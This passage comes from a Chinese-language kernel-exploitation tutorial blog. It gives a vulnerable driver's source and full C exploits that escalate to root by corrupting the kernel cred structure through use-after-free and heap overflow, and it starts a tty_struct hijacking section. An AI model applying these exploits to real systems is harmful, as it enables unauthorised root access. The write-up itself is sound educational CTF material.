                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/ret2dir2.jpg"
                      alt="ret2dir2"
                ></p>
<p>（2）栈不断抬高，执行get_root。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/ret2dir.jpg"
                      alt="ret2dir"
                ></p>
<h1 id="内核堆利用"><a href="#内核堆利用" class="headerlink" title="内核堆利用"></a>内核堆利用</h1><h2 id="heap-bof"><a href="#heap-bof" class="headerlink" title="heap_bof"></a>heap_bof</h2><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>题目给了源码，存在<code>UAF</code>和<code>heap overflow</code>两种漏洞。内核版本为<code>4.4.27</code></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/device.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="keyword">class</span> *<span class="title">bof_class</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> <span class="title">cdev</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> bof_major = <span class="number">256</span>;</span><br><span class="line"><span class="type">char</span> *ptr[<span class="number">40</span>];<span class="comment">// 指针数组，用于存放分配的指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">param</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> len;       <span class="comment">// 内容长度</span></span><br><span class="line">    <span class="type">char</span> *buf;        <span class="comment">// 用户态缓冲区地址</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> idx;<span class="comment">// 表示 ptr 数组的 索引</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">bof_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">param</span> <span class="title">p_arg</span>;</span></span><br><span class="line">    copy_from_user(&amp;p_arg, (<span class="type">void</span> *) arg, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> param));</span><br><span class="line">    <span class="type">long</span> retval = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">            copy_to_user(p_arg.buf, ptr[p_arg.idx], p_arg.len);</span><br><span class="line">            printk(<span class="string">&quot;copy_to_user: 0x%lx\n&quot;</span>, *(<span class="type">long</span> *) ptr[p_arg.idx]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            copy_from_user(ptr[p_arg.idx], p_arg.buf, p_arg.len);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            kfree(ptr[p_arg.idx]);</span><br><span class="line">            printk(<span class="string">&quot;free: 0x%p\n&quot;</span>, ptr[p_arg.idx]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            ptr[p_arg.idx] = kmalloc(p_arg.len, GFP_KERNEL);</span><br><span class="line">            printk(<span class="string">&quot;alloc: 0x%p, size: %2lx\n&quot;</span>, ptr[p_arg.idx], p_arg.len);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            retval = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">bof_fops</span> =</span> &#123;</span><br><span class="line">        .owner = THIS_MODULE,</span><br><span class="line">        .unlocked_ioctl = bof_ioctl,<span class="comment">//linux 2.6.36内核之后unlocked_ioctl取代ioctl</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">bof_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="comment">//设备号</span></span><br><span class="line">    <span class="type">dev_t</span> devno = MKDEV(bof_major, <span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> result;</span><br><span class="line">    <span class="keyword">if</span> (bof_major)<span class="comment">//静态分配设备号</span></span><br><span class="line">        result = register_chrdev_region(devno, <span class="number">1</span>, <span class="string">&quot;bof&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;<span class="comment">//动态分配设备号</span></span><br><span class="line">        result = alloc_chrdev_region(&amp;devno, <span class="number">0</span>, <span class="number">1</span>, <span class="string">&quot;bof&quot;</span>);</span><br><span class="line">        bof_major = MAJOR(devno);</span><br><span class="line">    &#125;</span><br><span class="line">    printk(<span class="string">&quot;bof_major /dev/bof: %d\n&quot;</span>, bof_major);</span><br><span class="line">    <span class="keyword">if</span> (result &lt; <span class="number">0</span>) <span class="keyword">return</span> result;</span><br><span class="line">    bof_class = class_create(THIS_MODULE, <span class="string">&quot;bof&quot;</span>);</span><br><span class="line">    device_create(bof_class, <span class="literal">NULL</span>, devno, <span class="literal">NULL</span>, <span class="string">&quot;bof&quot;</span>);</span><br><span class="line">    cdev_init(&amp;cdev, &amp;bof_fops);</span><br><span class="line">    cdev.owner = THIS_MODULE;</span><br><span class="line">    cdev_add(&amp;cdev, devno, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">bof_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    cdev_del(&amp;cdev);</span><br><span class="line">    device_destroy(bof_class, MKDEV(bof_major, <span class="number">0</span>));</span><br><span class="line">    class_destroy(bof_class);</span><br><span class="line">    unregister_chrdev_region(MKDEV(bof_major, <span class="number">0</span>), <span class="number">1</span>);</span><br><span class="line">    printk(<span class="string">&quot;bof exit success\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;exp_ttt&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">module_init(bof_init);</span><br><span class="line">module_exit(bof_exit);</span><br></pre></td></tr></table></figure></div>

<p><strong>boot.sh</strong></p>
<p>这道题是多核多线程。并且开启了<code>smep</code>和<code>smap</code>。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -initrd rootfs.cpio \</span><br><span class="line">  -kernel bzImage \</span><br><span class="line">  -m 512M \</span><br><span class="line">  -nographic \</span><br><span class="line">  -append <span class="string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1 quiet kaslr&#x27;</span> \</span><br><span class="line">  -monitor /dev/null \</span><br><span class="line">  -smp cores=2,threads=2 \</span><br><span class="line">  -cpu kvm64,+smep,+smap \</span><br></pre></td></tr></table></figure></div>

<h2 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h2><h3 id="利用思路-8"><a href="#利用思路-8" class="headerlink" title="利用思路"></a>利用思路</h3><p><code>cred</code> 结构体大小为 <code>0xa8</code> ，根据 <code>slub</code> 分配机制，如果申请和释放大小为 <code>0xa8</code>（实际为 <code>0xc0</code> ）的内存块，此时再开一个线程，则该线程的 <code>cred</code> 结构题正是刚才释放掉的内存块。利用 <code>UAF</code> 漏洞修改 <code>cred</code> 就可以实现提权。</p>
<h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_MALLOC 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_FREE 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_EDIT 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_READ 9</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">param</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> len;       <span class="comment">// 内容长度</span></span><br><span class="line">    <span class="type">char</span> *buf;        <span class="comment">// 用户态缓冲区地址</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> idx;<span class="comment">// 表示 ptr 数组的 索引</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;dev/bof&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">param</span> <span class="title">p</span> =</span> &#123;<span class="number">0xa8</span>, <span class="built_in">malloc</span>(<span class="number">0xa8</span>), <span class="number">1</span>&#125;;</span><br><span class="line">    ioctl(fd, BOF_MALLOC, &amp;p);</span><br><span class="line">    ioctl(fd, BOF_FREE, &amp;p);</span><br><span class="line">    <span class="type">int</span> pid = fork(); <span class="comment">// 这个线程申请的cred结构体obj即为刚才释放的obj。</span></span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-]fork error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        p.buf = <span class="built_in">malloc</span>(p.len = <span class="number">0x30</span>);</span><br><span class="line">        <span class="built_in">memset</span>(p.buf, <span class="number">0</span>, p.len);</span><br><span class="line">        ioctl(fd, BOF_EDIT, &amp;p); <span class="comment">// 修改用户ID</span></span><br><span class="line">        <span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[+]root success&quot;</span>);</span><br><span class="line">            system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-]root failed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>但是此种方法在较新版本 <code>kernel</code> 中已不可行，我们已无法直接分配到 <code>cred_jar</code> 中的 <code>object</code>，这是因为 <code>cred_jar</code> 在创建时设置了 <code>SLAB_ACCOUNT</code> 标记，在 <code>CONFIG_MEMCG_KMEM=y</code> 时（默认开启）<code>cred_jar</code> 不会再与相同大小的 <code>kmalloc-192</code> 进行合并。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel version == 4.4.72</span></span><br><span class="line"><span class="type">void</span> __init <span class="title function_">cred_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* allocate a slab in which we can store credentials */</span></span><br><span class="line">	cred_jar = kmem_cache_create(<span class="string">&quot;cred_jar&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> cred),</span><br><span class="line">				     <span class="number">0</span>, SLAB_HWCACHE_ALIGN|SLAB_PANIC, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// kernel version == 4.5</span></span><br><span class="line"><span class="type">void</span> __init <span class="title function_">cred_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* allocate a slab in which we can store credentials */</span></span><br><span class="line">	cred_jar = kmem_cache_create(<span class="string">&quot;cred_jar&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> cred), <span class="number">0</span>,</span><br><span class="line">			SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="Overflow"><a href="#Overflow" class="headerlink" title="Overflow"></a>Overflow</h2><p>溢出修改 <code>cred</code> ，和前面 UAF 修改 <code>cred</code> 一样，在新版本失效。多核堆块难免会乱序，溢出之前记得多申请一些<code>0xc0</code>大小的<code>obj</code>，因为我们 <code>freelist</code> 中存在很多之前使用又被释放的 <code>obj</code> 导致的 <code>obj</code> 乱序。我们需要一个排列整齐的内存块用于修改。</p>
<h3 id="利用思路-9"><a href="#利用思路-9" class="headerlink" title="利用思路"></a>利用思路</h3><ol>
<li>多申请几个<code>0xa8</code>大小的内存块，将原有混乱的<code>freelist</code> 变为地址连续的 <code>freelist</code>。</li>
<li>利用堆溢出，修改被重新申请作为<code>cred</code>的<code>ptr[5]</code>凭证区为<code>0</code>。</li>
</ol>
<h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">param</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> len;    <span class="comment">// 内容长度</span></span><br><span class="line">    <span class="type">char</span> *buf;     <span class="comment">// 用户态缓冲区地址</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> idx; <span class="comment">// 表示 ptr 数组的 索引</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> BOF_NUM = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> bof_fd = open(<span class="string">&quot;/dev/bof&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (bof_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open bof device.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">param</span> <span class="title">p</span> =</span> &#123;<span class="number">0xa8</span>, <span class="built_in">malloc</span>(<span class="number">0xa8</span>), <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 让驱动分配 0x40 个 0xa8  的内存块</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40</span>; i++) &#123;</span><br><span class="line">        ioctl(bof_fd, <span class="number">5</span>, &amp;p);  <span class="comment">// malloc</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] clear heap done&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 让驱动分配 10 个 0xa8  的内存块</span></span><br><span class="line">    <span class="keyword">for</span> (p.idx = <span class="number">0</span>; p.idx &lt; BOF_NUM; p.idx++) &#123;</span><br><span class="line">        ioctl(bof_fd, <span class="number">5</span>, &amp;p);  <span class="comment">// malloc</span></span><br><span class="line">    &#125;</span><br><span class="line">    p.idx = <span class="number">5</span>;</span><br><span class="line">    ioctl(bof_fd, <span class="number">7</span>, &amp;p); <span class="comment">// free</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 fork 分配一个 cred结构体</span></span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] fork error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 此时 ptr[4] 和 cred相邻</span></span><br><span class="line">    <span class="comment">// 溢出 修改 cred 实现提权</span></span><br><span class="line">    p.idx = <span class="number">4</span>, p.len = <span class="number">0xc0</span> + <span class="number">0x30</span>;</span><br><span class="line">    <span class="built_in">memset</span>(p.buf, <span class="number">0</span>, p.len);</span><br><span class="line">    ioctl(bof_fd, <span class="number">8</span>, &amp;p);</span><br><span class="line">    <span class="keyword">if</span> (!pid) &#123;</span><br><span class="line">        <span class="comment">//一直到egid及其之前的都变为了0，这个时候就已经会被认为是root了</span></span><br><span class="line">        <span class="type">size_t</span> uid = getuid();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] uid: %zx\n&quot;</span>, uid);</span><br><span class="line">        <span class="keyword">if</span> (!uid) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[+] root success&quot;</span>);</span><br><span class="line">            <span class="comment">// 权限修改完毕，启动一个shell，就是root的shell了</span></span><br><span class="line">            system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] root fail&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        wait(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="tty-struct-劫持"><a href="#tty-struct-劫持" class="headerlink" title="tty_struct 劫持"></a>tty_struct 劫持</h2><p><strong>boot.sh</strong></p>
<p>这道题<code>gadget</code>较少，我们就关了<code>smep</code>保护。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -initrd rootfs.img \</span><br><span class="line">  -kernel bzImage \</span><br><span class="line">  -m 512M \</span><br><span class="line">  -nographic \</span><br><span class="line">  -append <span class="string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1 quiet nokaslr&#x27;</span> \</span><br><span class="line">  -monitor /dev/null \</span><br><span class="line">  -s \</span><br><span class="line">  -cpu kvm64 \</span><br><span class="line">  -smp cores=1,threads=1 \</span><br><span class="line">  --nographic</span><br></pre></td></tr></table></figure></div>

<h3 id="利用思路-10"><a href="#利用思路-10" class="headerlink" title="利用思路"></a>利用思路</h3><p>在 <code>/dev</code> 下有一个伪终端设备 <code>ptmx</code> ，在我们打开这个设备时内核中会创建一个 <code>tty_struct</code> 结构体，</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ptmx_open (drivers/tty/pty.c)</span><br><span class="line">-&gt; tty_init_dev (drivers/tty/tty_io.c)</span><br><span class="line">  -&gt; alloc_tty_struct (drivers/tty/tty_io.c)</span><br></pre></td></tr></table></figure></div>

<p><code>tty</code> 的结构体 <code>tty_srtuct</code> 定义在 <code>linux/tty.h</code> 中。其中 <code>ops</code> 项（<code>64bit</code> 下位于 结构体偏移 <code>0x18</code> 处）指向一个存放 <code>tty</code> 相关操作函数的函数指针的结构体 <code>tty_operations</code> 。其魔数为<code>0x5401</code></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sizeof(struct tty_struct) == 0x2e0</span></span><br><span class="line"><span class="comment">/* tty magic number */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_MAGIC        0x5401</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">	<span class="type">int</span>  (*ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">		    <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>使用 <code>tty</code> 设备的前提是挂载了 <code>ptmx</code> 设备。</p>
